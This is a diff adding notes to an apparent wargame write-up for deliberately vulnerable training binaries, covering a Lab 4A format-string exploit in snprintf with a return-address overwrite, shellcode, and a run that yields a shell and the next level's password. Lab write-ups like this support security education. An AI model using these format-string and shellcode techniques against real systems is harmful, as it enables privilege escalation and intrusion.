@@ -169,3 +169,21 @@ lab4B@warzone:/levels/lab04$ (python /tmp/lab4B.py; cat -) | ./lab4B
 cat ~lab4A/.pass
 fg3ts_d0e5n7_m4k3_y0u_1nv1nc1bl3
 ```
+
+### Lab 4A
+* Need to run from a directory that contains a writable _backups_ dir.
+* Vuln is in snprintf
+* String is unaligned (since it starts with a string "Starting back up: ".
+* Since args come in argv, addresses will shift as argument changes size.
+* Put a byte before the address (e.g. xAAAA) and can write to it through the 14th argument.
+* RA at 0xbffff65c (76$) in gdb.
+* Normal shellcode should work
+* See _lab4A.py_.
+
+```bash
+lab4A@warzone:/tmp$ fixenv /levels/lab04/lab4A `python /tmp/lab4A.py`
+$ id
+uid=1016(lab4A) gid=1017(lab4A) euid=1017(lab4end) groups=1018(lab4end),1001(gameuser),1017(lab4A)
+$ cat ~lab4end/.pass
+1t_w4s_ju5t_4_w4rn1ng
+```
